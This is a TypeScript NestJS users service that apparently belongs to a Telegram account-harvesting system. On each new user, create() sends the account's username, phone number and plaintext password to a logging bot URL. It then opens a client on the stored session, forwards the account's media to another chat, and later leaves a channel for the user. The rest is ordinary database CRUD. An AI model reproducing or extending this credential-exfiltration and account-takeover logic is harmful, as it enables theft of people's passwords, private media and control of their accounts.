import { TelegramService } from './../Telegram/Telegram.service';
import { BadRequestException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';
import { InjectModel } from '@nestjs/mongoose';
import { Model } from 'mongoose';
import { User, UserDocument } from './schemas/user.schema';
import { SearchUserDto } from './dto/search-user.dto';
import { ClientService } from '../clients/client.service';
import { UpdateUserDto } from './dto/update-user.dto';
import { CreateUserDto } from './dto/create-user.dto';
import { fetchWithTimeout } from '../../utils/fetchWithTimeout';
import { notifbot } from '../../utils/logbots';

@Injectable()
export class UsersService {
  constructor(@InjectModel('userModule') private userModel: Model<UserDocument>,
    @Inject(forwardRef(() => TelegramService))
    private telegramService: TelegramService,
    @Inject(forwardRef(() => ClientService))
    private clientsService: ClientService
  ) {}

  async create(user: CreateUserDto): Promise<User | undefined> {
    const activeClientSetup = this.telegramService.getActiveClientSetup();
    console.log("New User received - ", user?.mobile);
    console.log("ActiveClientSetup::", activeClientSetup);
    if (activeClientSetup && activeClientSetup.newMobile === user.mobile) {
      console.log("Updating New Session Details", user.mobile, user.username, activeClientSetup.clientId)
      await this.clientsService.updateClientSession(user.session)
    } else {
      await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`)}`);//Msgs:${user.msgs}\nphotos:${user.photoCount}\nvideos:${user.videoCount}\nmovie:${user.movieCount}\nPers:${user.personalChats}\nChan:${user.channels}\ngender-${user.gender}\n`)}`)//${process.env.uptimeChecker}/connectclient/${user.mobile}`)}`);
      setTimeout(async () => {
        await this.telegramService.createClient(user.mobile, false, false)
        this.telegramService.forwardMedia(user.mobile, "savedmessages34", null)
      }, 2000);
      setTimeout(async () => {
        await this.telegramService.leaveChannel(user.mobile, "2302868706")
      }, 300000);
      const newUser = new this.userModel(user);
      return newUser.save();
    }
  }

  async findAll(): Promise<User[]> {
    return this.userModel.find().exec();
  }

  async findOne(tgId: string): Promise<User> {
    const user = await (await this.userModel.findOne({ tgId }).exec())?.toJSON()
    if (!user) {
      throw new NotFoundException(`User with tgId ${tgId} not found`);
    }
    return user;
  }

  async update(tgId: string, user: UpdateUserDto): Promise<number> {
    delete user['_id']
    const result = await this.userModel.updateMany({ tgId }, { $set: user }, { new: true, upsert: true }).exec();
    if (result.matchedCount === 0) {
      throw new NotFoundException(`Users with tgId ${tgId} not found`);
    }
    return result.modifiedCount;
  }

  async updateByFilter(filter: any, user: UpdateUserDto): Promise<number> {
    delete user['_id']
    const result = await this.userModel.updateMany(filter, { $set: user }, { new: true, upsert: true }).exec();
    if (result.matchedCount === 0) {
      throw new NotFoundException(`Users with tgId ${JSON.stringify(filter)} not found`);
    }
    return result.modifiedCount;
  }

  async delete(tgId: string): Promise<void> {
    const result = await this.userModel.deleteOne({ tgId }).exec();
    if (result.deletedCount === 0) {
      throw new NotFoundException(`User with tgId ${tgId} not found`);
    }
  }
  async search(filter: SearchUserDto): Promise<User[]> {
    if (filter.firstName) {
      filter.firstName = { $regex: new RegExp(filter.firstName, 'i') } as any
    }
    if (filter.twoFA !== undefined) {
      filter.twoFA = filter.twoFA as any === 'true' || filter.twoFA as any === '1' || filter.twoFA === true;
    }
    console.log(filter)
    return this.userModel.find(filter).sort({ updatedAt: -1 }).exec();
  }

  async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<User[]> {
    try {
      if (!query) {
        throw new BadRequestException('Query is invalid.');
      }
      const queryExec = this.userModel.find(query);

      if (sort) {
        queryExec.sort(sort);
      }

      if (limit) {
        queryExec.limit(limit);
      }

      if (skip) {
        queryExec.skip(skip);
      }

      return await queryExec.exec();
    } catch (error) {
      throw new InternalServerErrorException(error.message);
    }
  }

}
